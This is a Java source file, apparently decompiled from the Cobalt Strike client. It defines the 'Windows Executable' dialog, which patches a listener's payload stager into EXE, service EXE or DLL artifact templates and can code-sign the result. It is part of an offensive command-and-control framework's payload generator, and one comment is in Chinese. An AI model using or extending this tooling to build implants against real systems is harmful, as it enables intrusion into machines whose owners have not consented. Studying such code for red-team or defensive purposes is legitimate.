package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import common.ArtifactUtils;
import common.CommonUtils;
import common.ListenerUtils;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;
import dialog.SafeDialogCallback;
import dialog.SafeDialogs;
import java.awt.event.ActionEvent;
import java.io.File;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JFrame;

public class WindowsExecutableDialog implements DialogListener, SafeDialogCallback {
   protected JFrame dialog = null;
   protected AggressorClient client = null;
   protected Map options = null;
   protected byte[] stager;

   public WindowsExecutableDialog(AggressorClient var1) {
      this.client = var1;
   }

   public void dialogAction(ActionEvent var1, Map var2) {
      this.options = var2;
      boolean var3 = DialogUtils.bool(var2, "x64");
      String var4 = DialogUtils.string(var2, "listener");
      this.stager = ListenerUtils.getListener(this.client, var4).getPayloadStager(var3 ? "x64" : "x86");
      if (this.stager.length == 0) {
         DialogUtils.showError("No " + (var3 ? "x64" : "x86") + " stager for " + var4);
      } else {
         String var5 = var2.get("output") + "";
         String var6 = "";
         if (var5.indexOf("EXE") > -1) {
            var6 = "artifact.exe";
         } else if (var5.indexOf("DLL") > -1) {
            var6 = "artifact.dll";
         }

         SafeDialogs.saveFile((JFrame)null, var6, this);
      }
   }

   public void dialogResult(String var1) {
      String var2 = this.options.get("output") + "";
      String var3 = this.options.get("listener") + "";
      boolean var4 = DialogUtils.bool(this.options, "x64");
      boolean var5 = DialogUtils.bool(this.options, "sign");
      if (var4) {
         if (var2.equals("Windows EXE")) {
            (new ArtifactUtils(this.client)).patchArtifact(this.stager, "artifact64.exe", var1);
         } else if (var2.equals("Windows Service EXE")) {
            (new ArtifactUtils(this.client)).patchArtifact(this.stager, "artifact64svc.exe", var1);
         } else if (var2.equals("Windows DLL")) {
            (new ArtifactUtils(this.client)).patchArtifact(this.stager, "artifact64.x64.dll", var1);
         }
      } else if (var2.equals("Windows EXE")) {
         (new ArtifactUtils(this.client)).patchArtifact(this.stager, "artifact32.exe", var1);
      } else if (var2.equals("Windows Service EXE")) {
         (new ArtifactUtils(this.client)).patchArtifact(this.stager, "artifact32svc.exe", var1);
      } else if (var2.equals("Windows DLL")) {
         (new ArtifactUtils(this.client)).patchArtifact(this.stager, "artifact32.dll", var1);
      }

      if (var5) {
         DataUtils.getSigner(this.client.getData()).sign(new File(var1));
      }

      DialogUtils.showInfo("Saved " + var2 + " to\n" + var1);
   }

   //windows execute对话框设置
   public void show() {
      this.dialog = DialogUtils.dialog("Windows Executable", 640, 480);
      DialogManager var1 = new DialogManager(this.dialog);
      var1.addDialogListener(this);
      var1.sc_listener_stagers("listener", "Listener:", this.client);
      var1.combobox("output", "Output:", CommonUtils.toArray("Windows EXE, Windows Service EXE, Windows DLL"));
      var1.checkbox_add("x64", "x64:", "Use x64 payload");
      var1.checkbox_add("sign", "sign:", "Sign executable file", DataUtils.getSigner(this.client.getData()).available());
      JButton var2 = var1.action("Generate");
      JButton var3 = var1.help("https://www.cobaltstrike.com/help-windows-exe");
      this.dialog.add(DialogUtils.description("This dialog generates a Windows executable. Use Cobalt Strike Arsenal scripts (Help -> Arsenal) to customize this process."), "North");
      this.dialog.add(var1.layout(), "Center");
      this.dialog.add(DialogUtils.center(var2, var3), "South");
      this.dialog.pack();
      this.dialog.setVisible(true);
   }
}
